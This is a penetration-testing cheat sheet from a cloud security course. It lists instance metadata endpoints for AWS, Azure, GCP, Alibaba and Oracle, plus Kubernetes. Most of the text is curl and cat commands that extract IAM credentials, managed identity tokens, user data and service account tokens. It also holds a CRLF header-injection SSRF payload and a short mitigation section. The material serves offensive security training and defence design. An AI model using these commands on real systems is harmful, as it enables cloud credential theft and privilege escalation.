---
tags: [cloud, metadata, imds, ssrf, cheat-sheet, pentesting]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.24 Cloud Metadata"
---

# 24 - Cloud Metadata Endpoint Cheat Sheet

## Introduction to Cloud Metadata

The Instance Metadata Service (IMDS) is a REST endpoint provided by cloud service providers (CSPs) that allows virtual machines, containers, and serverless functions to securely query information about themselves. This metadata includes networking details, instance IDs, regions, user-data scripts, and most critically, temporary IAM credentials (tokens).

Because the metadata service is typically accessible via a non-routable link-local IP address (`169.254.169.254`), it cannot be accessed directly from the internet. However, if an attacker discovers a Server-Side Request Forgery (SSRF) or achieves Remote Code Execution (RCE) on the instance, they can query this endpoint to escalate privileges and pivot into the cloud environment.

This cheat sheet compiles the most critical IMDS endpoints across AWS, Azure, Google Cloud (GCP), Alibaba Cloud, and Oracle Cloud, focusing on credential extraction and sensitive data retrieval.

## Architecture and Attack Surface

The core danger of IMDS lies in its trust model: the cloud provider inherently trusts any request originating from the instance's network namespace.

```text
+-----------------------+                            +-------------------------+
|   Attacker (External) |                            |   Cloud Provider IMDS   |
|-----------------------|                            |   (169.254.169.254)     |
| 1. Sends malicious    |                            |                         |
|    URL via SSRF       |                            |                         |
+----------+------------+                            +-----------+-------------+
           |                                                     ^
           v                                                     |
+----------+------------+                                        |
|   Vulnerable App      |   2. App parses URL and fetches        |
|   (Target VM)         | ---------------------------------------+
|-----------------------|      http://169.254.169.254/...        |
| - SSRF Vulnerability  |                                        |
| - Proxies request     | <--------------------------------------+
+-----------------------+   3. IMDS returns Token/Data
           |
           | 4. App returns IMDS response to Attacker
           v
+-----------------------+
|   Attacker            | -> Assumes Cloud Role, extracts keys, moves laterally.
+-----------------------+
```

## Amazon Web Services (AWS)

AWS offers two versions of its metadata service: IMDSv1 (request/response) and IMDSv2 (session-oriented, requiring a PUT request to get a token).

### AWS IMDSv1 (Legacy, highly vulnerable to SSRF)

**Extract IAM Role Name:**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Extract Temporary Credentials (Keys & Token):**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```

**Extract User Data (often contains hardcoded secrets or startup scripts):**
```bash
curl http://169.254.169.254/latest/user-data/
```

### AWS IMDSv2 (Requires Header and Token)

IMDSv2 mitigates simple SSRF by requiring a `PUT` request to obtain a session token, which must then be included as a header in subsequent `GET` requests.

**1. Get the Token (Valid for 21600 seconds):**
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
```

**2. Use the Token to get credentials:**
```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```
*(For bypass techniques, refer to `[[25 - IMDSv2 Bypass Techniques]]`)*

## Microsoft Azure

Azure requires the `Metadata: true` header to prevent simple SSRF.

**Extract Managed Identity Token:**
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```
*Note: The `resource` parameter determines what the token is valid for. `https://management.azure.com/` is for Azure Resource Manager (ARM). For Key Vault, use `https://vault.azure.net`.*

**Extract Instance Metadata (OS, tags, networking):**
```bash
curl 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H Metadata:true
```

**Extract User Data (Base64 encoded):**
```bash
curl 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text' -H Metadata:true
```

## Google Cloud Platform (GCP)

GCP also requires a custom header: `Metadata-Flavor: Google`.

**Extract Default Service Account Token:**
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```
*(Note: GCP resolves `metadata.google.internal` to `169.254.169.254`. An attacker can use the IP directly).*

**Extract SSH Public Keys and Project Metadata:**
```bash
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" -H "Metadata-Flavor: Google"
```
*Look for `ssh-keys`, `startup-script`, or `kube-env` (which may contain cluster certificates).*

**Legacy GCP Metadata (v0.1 / v1beta1 - Deprecated but worth testing for misconfigurations):**
Previously, GCP allowed requests without headers, but this is heavily restricted in modern environments.
```bash
curl http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token
```

## Alibaba Cloud (Aliyun)

Alibaba Cloud's implementation is similar to AWS IMDSv1 and is heavily targeted in the wild.

**Extract STS Credentials (Role Name):**
```bash
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
```
*(Note the IP difference: Alibaba uses `100.100.100.200`)*

**Extract Keys and Token:**
```bash
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
```

**Extract User Data:**
```bash
curl http://100.100.100.200/latest/user-data/
```

## Oracle Cloud Infrastructure (OCI)

OCI has two versions, v1 (deprecated) and v2.

**OCI v2 (Requires Authorization header):**
```bash
curl -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/
```

**OCI v1 (If enabled, susceptible to basic SSRF):**
```bash
curl http://169.254.169.254/opc/v1/instance/
```

## Kubernetes (Kubelet / Pod Metadata)

While not a CSP metadata endpoint, when operating inside a container, attackers often target the Kubelet or local service account tokens.

**Extracting Pod Service Account Token (Local File System):**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Querying Kubelet API (if accessible/unauthenticated):**
```bash
curl https://<Node-IP>:10250/pods
```

## Header Injection via SSRF

When an attacker encounters an SSRF vulnerability but the CSP requires a custom header (e.g., Azure's `Metadata: true`), the attacker must find a way to inject headers. This can sometimes be achieved via:

1. **CRLF Injection**: If the application is vulnerable to HTTP Response Splitting or CRLF injection in the URL path.
   `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/%0d%0aMetadata:%20true`
2. **GraphQL/JSON parsing anomalies**: If the target application allows defining arbitrary headers in the request payload.
3. **DNS Rebinding**: In rare edge cases where host headers are reflected.

## Mitigation Summary

1. **Enforce IMDSv2 (AWS)**: Ensure IMDSv1 is disabled globally across all EC2 instances and launch templates.
2. **WAF & Network Policies**: Use Web Application Firewalls to drop requests containing `169.254.169.254` or `metadata.google.internal`. Use local host firewall rules (e.g., `iptables`) to block the `www-data` or equivalent application user from accessing the metadata IP, only allowing the `root` or specific necessary users.
3. **Patch SSRF**: Fundamentally, IMDS abuse is a post-exploitation or SSRF impact. Secure the application code against arbitrary URL fetching.

## Chaining Opportunities

- **Initial Recon**: Used heavily during `[[27 - Cloud SSRF to Credential Theft — Full Chain]]` to turn a simple web vulnerability into a cloud breach.
- **Privilege Escalation**: Credentials extracted here are fed directly into cloud enumeration tools `[[26 - Cloud Enumeration Tools]]`.
- **Evasion**: If stuck on AWS, leverage `[[25 - IMDSv2 Bypass Techniques]]`.

## Deep Dive: Advanced Real-World Scenarios and Case Studies

In advanced penetration testing engagements, simplistic vulnerabilities are rarely found in isolation. Instead, attackers must chain multiple low-severity issues to achieve critical impact. The complexity of modern cloud architectures often obscures these attack paths from defenders, while providing numerous opportunities for patient adversaries.

Consider a scenario where an organization implements strict IAM policies but neglects network-level egress controls. An attacker might exploit a minor Server-Side Request Forgery (SSRF) vulnerability that, due to strict IAM, yields a token with seemingly useless permissions. However, by thoroughly enumerating the environment using tools discussed previously, the attacker discovers an obscure, legacy API endpoint internal to the VPC. This endpoint, trusting any request originating from within the network, allows the attacker to manipulate database records.

This illustrates a fundamental principle in cloud security: identity is the new perimeter, but network controls still provide critical defense-in-depth. A failure in either domain can lead to a complete compromise.

Furthermore, the operational tempo of cloud deployments—where Infrastructure as Code (IaC) pipelines deploy changes multiple times a day—frequently introduces transient vulnerabilities. A permission granted temporarily for debugging might be accidentally committed to the main branch, exposing a highly privileged role for just a few hours. Advanced adversaries automate their reconnaissance to detect and exploit these fleeting windows of opportunity.

To combat this, defensive teams must adopt an "assume breach" mentality. This means implementing continuous monitoring of control plane logs (like AWS CloudTrail or Azure Activity Logs), utilizing anomaly detection to spot unusual API call patterns, and conducting regular red team exercises to validate the effectiveness of security controls. The notes in this module provide the offensive perspective necessary to design these robust, resilient cloud architectures.

## Related Notes

- `[[25 - IMDSv2 Bypass Techniques]]`
- `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`
- `[[23 - Azure Managed Identity Abuse]]`
- `[[26 - Cloud Enumeration Tools]]`
